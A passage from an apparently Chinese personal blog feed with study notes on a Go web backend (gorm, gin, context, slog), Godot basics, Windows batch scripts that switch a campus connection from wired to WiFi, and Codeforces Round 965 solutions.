用于数据模型的目录或包，通常表示数据库实体或数据结构</span><br><span class="line">└── utils          # 包含可以在整个应用程序中复用的工具/辅助函数的目录或包</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2024-8-16"><a href="#2024-8-16" class="headerlink" title="2024/8/16"></a>2024/8/16</h3><h4 id="命令行参数解析-amp-配置文件读取"><a href="#命令行参数解析-amp-配置文件读取" class="headerlink" title="命令行参数解析&amp;配置文件读取"></a>命令行参数解析&amp;配置文件读取</h4><ul><li>flag：解析命令行参数</li><li>viper：用于解析配置文件<ul><li>viper有优先使用环境变量的配置，主要是方便程序在不同开发环境间迁移</li></ul></li></ul><h3 id="2024-8-18"><a href="#2024-8-18" class="headerlink" title="2024/8/18"></a>2024/8/18</h3><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h4><p><a href="https://mermaid.nodejs.cn/syntax/entityRelationshipDiagram.html">https://mermaid.nodejs.cn/syntax/entityRelationshipDiagram.html</a></p><h5 id="user"><a href="#user" class="headerlink" title="user"></a>user</h5><p> 权限控制: 7 张表（4 模型 + 3 关联）</p><ul><li>UserAuth（用户认证）：用户的基本信息。</li><li>Role（角色）：定义系统中的各种角色。</li><li>Resource（资源）：定义需要权限控制的资源，如API端点。</li><li>Menu（菜单）：定义系统的菜单结构，支持多级菜单。</li><li>用户认证：角色     1：n</li><li>角色：资源            1：n</li><li>角色：菜单            1：n</li></ul><p>//TODO 关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">erDiagram</span><br><span class="line">    USERAUTH ||--o&#123; ROLE : has</span><br><span class="line">    ROLE ||--o&#123; RESOURCE : has</span><br><span class="line">    ROLE ||--o&#123; MENU : has</span><br><span class="line">    </span><br><span class="line">    USERAUTH &#123;</span><br><span class="line">        username  string</span><br><span class="line">        password  string</span><br><span class="line">        loginType  int</span><br><span class="line">        ipAddress  string</span><br><span class="line">        ipSource  string</span><br><span class="line">        lastLoginTime  time</span><br><span class="line">        isDisable  boolean</span><br><span class="line">        isSuper  boolean</span><br><span class="line">        userInfoId  int</span><br><span class="line">        userInfo  USERINFO</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ROLE &#123;</span><br><span class="line">        name  string</span><br><span class="line">        label  string</span><br><span class="line">        isDisable  boolean</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    RESOURCE &#123;</span><br><span class="line">        name  string</span><br><span class="line">        parentId  int</span><br><span class="line">        url  string</span><br><span class="line">        method  string</span><br><span class="line">        anonymous  boolean</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    MENU &#123;</span><br><span class="line">        parentId  int</span><br><span class="line">        name  string</span><br><span class="line">        path  string</span><br><span class="line">        component  string</span><br><span class="line">        icon  string</span><br><span class="line">        orderNum  int8</span><br><span class="line">        redirect  string</span><br><span class="line">        catalogue  boolean</span><br><span class="line">        hidden  boolean</span><br><span class="line">        keepAlive  boolean</span><br><span class="line">        external  boolean</span><br><span class="line">        externalLink  string</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="Article"><a href="#Article" class="headerlink" title="Article"></a>Article</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">    Article &#123;</span><br><span class="line">        int id PK</span><br><span class="line">        string title</span><br><span class="line">        string desc</span><br><span class="line">        string content</span><br><span class="line">        string img</span><br><span class="line">        int type</span><br><span class="line">        int status</span><br><span class="line">        bool is_top</span><br><span class="line">        bool is_delete</span><br><span class="line">        string original_url</span><br><span class="line">        int category_id FK</span><br><span class="line">        int user_id FK</span><br><span class="line">    &#125;</span><br><span class="line">    Tag &#123;</span><br><span class="line">        int id PK</span><br><span class="line">        string name</span><br><span class="line">    &#125;</span><br><span class="line">    Category &#123;</span><br><span class="line">        int id PK</span><br><span class="line">        string name</span><br><span class="line">    &#125;</span><br><span class="line">    UserAuth &#123;</span><br><span class="line">        int id PK</span><br><span class="line">        string username</span><br><span class="line">    &#125;</span><br><span class="line">    ArticleTag &#123;</span><br><span class="line">        int article_id FK</span><br><span class="line">        int tag_id FK</span><br><span class="line">    &#125;</span><br><span class="line">    BlogArticleVO &#123;</span><br><span class="line">        int comment_count</span><br><span class="line">        int like_count</span><br><span class="line">        int view_count</span><br><span class="line">    &#125;</span><br><span class="line">    ArticlePaginationVO &#123;</span><br><span class="line">        int id</span><br><span class="line">        string img</span><br><span class="line">        string title</span><br><span class="line">    &#125;</span><br><span class="line">    RecommendArticleVO &#123;</span><br><span class="line">        int id</span><br><span class="line">        string img</span><br><span class="line">        string title</span><br><span class="line">        datetime created_at</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Article ||--o&#123; ArticleTag : has</span><br><span class="line">    Tag ||--o&#123; ArticleTag : has</span><br><span class="line">    Article ||--o| Category : belongs_to</span><br><span class="line">    Article ||--o| UserAuth : authored_by</span><br><span class="line">    Article ||--|| BlogArticleVO : extends</span><br><span class="line">    BlogArticleVO ||--|&#123; ArticlePaginationVO : has</span><br><span class="line">    BlogArticleVO ||--|&#123; RecommendArticleVO : has</span><br></pre></td></tr></table></figure><h4 id="gorm"><a href="#gorm" class="headerlink" title="gorm"></a>gorm</h4><p><a href="https://gorm.io/zh_CN/docs/models.html">https://gorm.io/zh_CN/docs/models.html</a></p><ul><li><strong>ORM（Object-Relational Mapping，对象关系映射）</strong>是一种在面向对象编程语言中实现数据持久化的一种技术。它允许开发者以面向对象的方式来操作数据库，而无需编写原始的SQL语句。</li><li><code>gen</code> (代码生成器)：生成与数据库表对应的模型和基本的数据库操作方法。</li><li><code>DAO</code> 层的主要职责是抽象和封装对底层数据源（如数据库、文件系统或其他持久化机制）的访问。</li><li><strong>客户端请求 -&gt; Servlet层 -&gt; Service层 -&gt; Dao层 -&gt; 数据库</strong></li><li>当你使用 GORM 并调用 <code>AutoMigrate</code> 方法时，GORM 会检查数据库中是否存在指定的表，如果不存在，GORM 会根据提供的模型创建相应的表。</li><li>软删除：实际未删除，只是普通查找不返回该链接，可以通过设置标志位实现</li></ul><blockquote><p>预加载（Eager Loading）和连接（Joining）的区别：</p><ul><li><p>N+1 查询问题：查询一个对象集合后对该集合的每个对象再进行<code>分别</code>的查询（1+n）</p></li><li><p>Preload：查询一个对象集合后对该集合的每个对象再进行<code>一次总体</code>的查询（1+1）</p></li><li><p><strong><code>Preload</code> 适合</strong>：</p><ul><li>数据关系复杂，多个关联关系。</li><li>需要避免数据冗余问题，返回的数据不希望有重复。</li><li>查询效率和性能不是最优先考虑的场景。</li></ul></li><li><p><strong><code>Joins</code> 适合</strong>：</p><ul><li><p>表的关系相对简单，适合通过一次 <code>JOIN</code> 查询获取结果。</p></li><li><p>数据量较大，希望减少查询次数，提高性能。</p></li><li><p>需要尽量在一次查询中获取所有相关数据的场景。</p></li></ul></li></ul></blockquote><h3 id="slog"><a href="#slog" class="headerlink" title="slog"></a>slog</h3><p><a href="https://segmentfault.com/a/1190000044992581">后端 - 万字解析 Go 官方结构化日志包 slog - 江湖十年 - SegmentFault 思否</a></p><p><code>Logger</code> 又被称为 <code>前端</code>，<code>Handler</code> 被称为 <code>后端</code>，而 <code>Record</code> 用来表示一条日志。</p><p>前端 <code>Logger</code> 直接面向用户侧，我们可以对其进行二次封装，来定制自己的用户 API。</p><p>后端 <code>Handler</code> 可以统一日志处理接口，我们也可以在自定义的 <code>Handler</code> 中很方便的集成如 <code>zap</code>、<code>zerolog</code> 等第三方日志库。你可以在 [Go Wiki: Resources for slog</p><h3 id="gin"><a href="#gin" class="headerlink" title="gin"></a>gin</h3><p>重量级来了！</p><p>面向切面编程AOP(Aspect-Oriented Programming）</p><p>系统实现“高内聚、低耦合”一直是我们程序开发者的追求。</p><p><a href="https://zhuanlan.zhihu.com/p/421999882">什么是面向切面编程? - 知乎 (zhihu.com)</a></p><p>使用<strong>路由组</strong>管理路由：方便不同路由的分组和中间件管理。</p><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><ul><li><p>go提供context包用于在不同协程间传递数据。</p></li><li><p><a href="https://www.bilibili.com/video/BV1Rh411P7oN/?spm_id_from=333.788.recommend_more_video.2&amp;vd_source=f59fd02e7da0d60ea4cdebb5e1c5f0d7">golang context该怎么玩儿_哔哩哔哩_bilibili</a></p></li></ul><p><strong>context in gin</strong></p><ul><li><code>gin</code>的<code>Context</code> 是处理 HTTP 请求的核心数据结构。它包含了请求和响应的所有信息，以及处理请求的中间件链。</li></ul><ol><li>当一个 HTTP 请求到达 Gin 服务器时，它首先被分配到一个 <code>Context</code> 对象。</li><li>随后进入中间件链。每个中间件可以对 <code>Context</code> 进行读取和修改，执行特定的逻辑。(<code>c.next()进入下一中间件</code>)</li><li>处理函数生成响应，并通过 <code>Context</code> 返回给客户端。</li><li>在响应返回给客户端之前，中间件链会逆序执行。(<code>c.next()返回</code>)</li></ol><p>为什么不设置全局变量而是使用上下文(context ctx)传递数据</p><ul><li><strong>线程安全</strong>：全局变量可能需要锁保护。</li><li><strong>中间件链</strong>：Gin 框架使用中间件链来处理请求。通过在上下文中传递数据，可以在链中的任何位置访问或修改这些数据，而不需要在中间件之间显式传递参数。</li><li><strong>数据隔离</strong>：在处理并发请求时，每个请求可能需要不同的数据副本。上下文允许每个请求拥有自己的数据副本，从而实现数据隔离。</li><li>…….</li></ul><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>中间件：中间件和处理函数是按照它们被注册的顺序执行的。</p><p>Gin框架默认提供了两个中间件：Logger 和 Recovery。    </p><ol><li><p><strong>全局中间件（Global Middleware）</strong>：</p><ul><li><p>对所有请求都生效。</p></li><li><p>使用 <code>r.Use()</code> 方法添加到 <code>*gin.Engine</code> 实例上。</p></li></ul></li><li><p><strong>路由组中间件（Group Middleware）</strong>：</p><ul><li>针对特定路由组，只对注册在该路由组下的所有路由生效。</li><li>使用 <code>group.Use()</code> 方法添加到 <code>*gin.RouterGroup</code> 实例上。</li></ul></li><li><p><strong>自定义中间件（Custom Middleware）</strong>：</p></li><li><p><strong>第三方中间件（Third-Party Middleware）</strong>：</p><ul><li>可在 <code>github.com/gin-gonic/contrib</code> 寻找对应的库。</li></ul></li></ol><p><strong>单个session和多个session的区别：</strong>单个session用于</p><p>//TODO</p><p>自定义组件，主要是增加一些功能和替换一些组件的条件检查、以及使用slog替换日志输出。</p><p><strong>基于 cookie 的 session:</strong></p><ul><li>当用户首次访问应用程序时，服务器会创建一个新的 Session，并生成一个唯一的 Session ID。</li><li>这个 Session ID 被发送到客户端浏览器，并存储在一个 Cookie 中。Cookie 通常包含 Session ID 和一些属性，如路径、域、过期时间、安全标志等。</li></ul><p>用户进行后续请求时，浏览器会自动在请求的 HTTP Header 中携带这个 Cookie，服务器通过解析 Cookie 中的 Session ID 来检索对应的 Session 数据。</p><h4 id="CROS"><a href="#CROS" class="headerlink" title="CROS"></a>CROS</h4><ul><li><p><code>同源策略（Same-Origin Policy）</code>：禁止来自不同域的JavaScript脚本与另一个域的资源进行交互。</p></li><li><p><code>同源</code>：相同的协议（protocol）、域名（host）和端口号（port）。</p></li><li><code>CROS</code>:</li><li><a href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">浏览器同源政策及其规避方法 - 阮一峰的网络日志 (ruanyifeng.com)</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com)</a></li></ul><h4 id="recovery"><a href="#recovery" class="headerlink" title="recovery"></a>recovery</h4><ul><li><code>recover</code> 的实现是内置的，不在 Go 的源代码中直接可见，因为它是编译器和运行时的一部分。</li><li><code>recover</code> 必须在 <code>defer</code> 语句中调用，并且只能恢复当前的 panic。</li><li><code>defer</code> 延迟调用语句的用处是在程序执行结束，甚至是崩溃后，仍然会被调用的语句</li></ul><blockquote><p>为什么recover必须在defer语句中调用？</p><ul><li><a href="https://cloud.tencent.com/developer/article/2337706">从源码解析Go语言中recover为什么一定要放在defer中执行-腾讯云开发者社区-腾讯云 (tencent.com)</a></li><li><a href="https://developer.aliyun.com/article/1445033#:~:text=当程序遇到无法恢复的错误情况时，可以使用 panic,来中断当前的执行流程，并开始逐层向上回溯（unwind）调用栈，直到遇到一个 recover 调用或者程序退出。">Go语言中的异常处理：理解panic与recover-阿里云开发者社区 (aliyun.com)</a></li><li>当<code>panic</code>被触发时，程序会开始回溯调用栈（栈展开（Stack Unwinding）），直到遇到一个<code>defer</code>函数调用中包含<code>recover</code>。</li><li>我们知道，当一个函数被调用时，若其执行出现错误（如c语言返回-1），我们不可能假设该函数执行成功，而是应该释放资源回溯到能处理该错误的函数。</li></ul></blockquote><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><h4 id="空结构体"><a href="#空结构体" class="headerlink" title="空结构体"></a>空结构体</h4><ul><li>空结构体不占用空间，可用作占位映射值</li><li>空结构体可以作为一个接口的唯一实现，任何具有空结构体类型的类型都自动满足了该接口</li></ul><h3 id="swagger"><a href="#swagger" class="headerlink" title="swagger"></a>swagger</h3><h3 id="util"><a href="#util" class="headerlink" title="util"></a>util</h3><h4 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h4><ul><li><a href="https://www.cnblogs.com/flydean/p/15292400.html">密码学系列之:bcrypt加密算法详解 - flydean - 博客园 (cnblogs.com)</a></li><li></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/game/godot/"/>
      <url>/2024/09/26/game/godot/</url>
      
        <content type="html"><![CDATA[<p>节点是场景树的一部分，最终继承自 Node 类。</p><h2 id="Godot-编辑器就是-Godot-游戏"><a href="#Godot-编辑器就是-Godot-游戏" class="headerlink" title="Godot 编辑器就是 Godot 游戏"></a>Godot 编辑器就是 Godot 游戏</h2><p>游戏就是由场景构成的树状结构，而每一个场景又是一个由节点构成的树状结构。</p><h3 id="GDScript"><a href="#GDScript" class="headerlink" title="GDScript"></a>GDScript</h3><p><a href="https://docs.godotengine.org/zh-cn/4.x/tutorials/scripting/gdscript/gdscript_basics.html#doc-gdscript">GDScript</a> 是一门<a href="https://zh.wikipedia.org/wiki/面向对象程序设计">面向对象</a>的<a href="https://zh.wikipedia.org/wiki/指令式編程">指令式</a>编程语言，<code>没有垃圾回收</code>（使用<code>引用计数</code>），采用<code>渐变类型</code>。</p><ul><li>每个GDScript都是一个隐藏的类。</li><li>类（节点）使用 PascalCase（大驼峰命名法），变量和函数使用 snake_case（蛇形命名法），常量使用 ALL_CAPS（全大写）</li><li>回调方法命名：_on_node_name_signal_name</li></ul><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul><li><p><strong>节点是你的游戏的基本构件</strong>。</p></li><li><p>名称。</p></li><li>可编辑的属性。</li><li><code>每帧</code>都可以接收<code>回调</code>以进行更新。</li><li>你可以使用新的属性和函数来进行扩展。</li><li>你可以将它们添加为其他节点的子节点。</li></ul><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ul><li><p>由节点（Node）组成</p></li><li><p>每个场景文件都是一个 <code>.tscn</code> 文件，它包含了场景的布局和配置信息。</p></li></ul><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>定时切换网络（从有线到无线）</title>
      <link href="/2024/09/07/bat/%E5%AE%9A%E6%97%B6%E5%88%87%E6%8D%A2%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/09/07/bat/%E5%AE%9A%E6%97%B6%E5%88%87%E6%8D%A2%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="定时切换网络（从有线到无线）"><a href="#定时切换网络（从有线到无线）" class="headerlink" title="定时切换网络（从有线到无线）"></a>定时切换网络（从有线到无线）</h1><p>在学校，校园网可能设置了定时断网，这时候从网线切换到wifi操作繁琐，我们可以使用脚本来实现自动切换网络</p><h3 id="start-bat"><a href="#start-bat" class="headerlink" title="start.bat"></a>start.bat</h3><ul><li>开启以太网，关闭WIFI</li><li>登录脚本的话不学校的系统不同，建议自行百度</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span></span><br><span class="line">:: 设置字符编码为UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> session &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">:: 检查是否有管理员权限</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%errorLevel%</span> == <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span> 当前脚本正在以管理员模式运行。</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> 当前脚本未以管理员模式运行。</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:: 断开无线网络连接</span><br><span class="line">netsh wlan disconnect</span><br><span class="line"><span class="built_in">echo</span> 已关闭WIFI连接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:: 运行Python脚本， pyw脚本不打开命令行窗口</span><br><span class="line">python C:\Users\RandolfluoPC\Desktop\fastboots\actoie.pyw</span><br><span class="line"><span class="built_in">echo</span> 成功登录网络</span><br><span class="line"></span><br><span class="line">:: 暂停脚本执行, 可以注释掉，执行完窗口关闭</span><br><span class="line"><span class="built_in">PAUSE</span></span><br></pre></td></tr></table></figure><h3 id="change-net-bat"><a href="#change-net-bat" class="headerlink" title="change_net .bat"></a>change_net .bat</h3><ul><li>开启WIFI，关闭以太网</li><li>注意设置要连接的WIFI，可通过</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 关闭命令回显，使输出更清洁</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span></span><br><span class="line">:: 设置字符编码为 UTF-<span class="number">8</span>，以确保正确显示特殊字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> session &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">:: 检查当前脚本是否以管理员权限运行</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%errorLevel%</span> == <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span> 当前脚本正在以管理员模式运行。</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> 当前脚本未以管理员模式运行。</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:: 连接到指定的无线网络</span><br><span class="line">netsh wlan connect name=&quot;Randolf luo phone&quot;</span><br><span class="line"><span class="built_in">echo</span> 成功切换至wifi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:: 暂停脚本执行, 可以注释掉，执行完窗口关闭</span><br><span class="line"><span class="built_in">PAUSE</span></span><br></pre></td></tr></table></figure><h3 id="添加到开机自启"><a href="#添加到开机自启" class="headerlink" title="添加到开机自启"></a>添加到开机自启</h3><ul><li><p>步骤参照参考链接，注意设置使用最高权限运行</p></li><li><p>在一般情况下，我们开机是在校园网开启时间，因此：</p><ul><li>设置start.bat为开机自启</li><li>设置change_net 为定时任务（断网前）</li></ul><p><img src="定时切换网络.assets/image-20240907113015287.png" alt="image-20240907113015287"></p></li></ul><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>我尝试禁用网卡，但是脚本老是报错，后来发现不禁也能使用，因此这里就先这样了</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.csdn.net/shuzfan/article/details/78118612">Win10 如何以管理员身份设置开机自启程序(1)_window10 管理员 如何 设置普通用户的启动项-CSDN博客</a></p><p><a href="https://blog.csdn.net/GnzhNetwork/article/details/133628212">Windows系统下禁用或启用网卡的命令行操作_windows 禁用网卡命令-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> bat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 965 (Div. 2)</title>
      <link href="/2024/08/10/codeforce/2024_8_10/"/>
      <url>/2024/08/10/codeforce/2024_8_10/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240812104054511.png" alt="image-20240812104054511"></p><p>题意你需要在二维平面上找到 <code>k</code> 个不同的整数坐标点$ (x1,y1)(x_1, y_1)(x1,y1), (x2,y2)(x_2, y_2)(x2,y2), …, (xk,yk)(x_k, y_k)(xk,yk)$，使得这些点的中心（质心）是给定的点$ (xc,yc)(x_c, y_c)(xc,yc)$。</p><ul><li><p>对于偶数个，使得输出值平均分配在输入两侧</p></li><li><p>对于奇数个，同时输出中间值（即输入）</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;                            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="type">int</span> cnt = c / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        cout &lt;&lt; a - i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b - i &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; a + i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b + i &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(c % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; endl; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">       <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240812104813425.png" alt="image-20240812104813425"></p><p>题意：你需要找到一个新的排列 <code>q</code>，使得其子数组的所有可能的和，与 <code>p</code> 的子数组的和相等的情况尽量少。</p><p><a href="https://www.cnblogs.com/definieren/p/18353122">Codeforces Round 965 (Div. 2) 题解 - definieren - 博客园 (cnblogs.com)</a></p><p>先猜只有 [1,n][1,n] 的和相等。<br>做前缀和，问题就变成了$ sumpr−sumpl≠sumqr−sumqlsumpr−sumpl≠sumqr−sumql$。<br>移项可得 $sumpr−sumqr≠sumpl−sumplsumpr−sumqr≠sumpl−sumpl$。<br>这就是在说，对于$ i≠ni≠n，Δi=sumqi−sumpiΔi=sumqi−sumpi $互不相等。</p><p>然后枚举构造方式，发现可以构造 $qi=pimodn+1qi=pimodn+1$。<br>不难发现，如果$ pi&lt;npi&lt;n$，则 $Δi=Δi−1+1Δi=Δi−1+1$；如果$ pi=npi=n$，则 $Δi=Δi−1−(n−1)Δi=Δi−1−(n−1)$。<br>观察到只有 $Δ0=Δn=0Δ0=Δn=0$，所以这个构造是对的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> q[N], p[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span 